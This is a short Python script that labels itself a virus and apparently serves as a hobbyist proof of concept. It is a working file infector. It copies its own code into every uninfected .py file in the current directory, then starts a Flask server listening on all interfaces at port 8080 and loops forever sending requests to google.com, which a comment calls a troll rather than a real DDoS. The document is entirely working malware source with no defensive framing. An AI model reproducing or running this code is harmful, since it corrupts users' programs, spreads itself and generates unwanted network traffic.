##### START OF VIRUS #####

import sys, glob, re, flask, requests
from threading import Thread

# Get a copy of the virus
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
  if (re.search('^##### START OF VIRUS #####', line)): inVirus = True
  if (inVirus): vCode.append(line)
  if (re.search('^##### END OF VIRUS #####', line)): break

# Find potential victims
progs = glob.glob("*.py")

# Check and infect
for prog in progs:
  fh = open(prog, "r")
  pCode = fh.readlines()
  fh.close()
  infected = False
  for line in pCode:
    if ('##### START OF VIRUS #####' in line):
      infected = True
      break
  if not infected:
    newCode = []
    if ('#!' in pCode[0]): newCode.append(pCode.pop(0))
    newCode.extend(vCode)
    newCode.extend(pCode)
    # Writing new virus infected code
    fh = open(prog, "w")
    fh.writelines(newCode)
    fh.close()


# Optional payload

app = flask.Flask("virus lol")

def run():
  app.run(host='0.0.0.0',port=8080)

thread = Thread(target=run)
try:
  thread.start()
except:
  pass

while True: # This is a troll, this isn't a real DDOS.
  req = requests.request("GET", url="https://www.google.com")
  print(req)

##### END OF VIRUS #####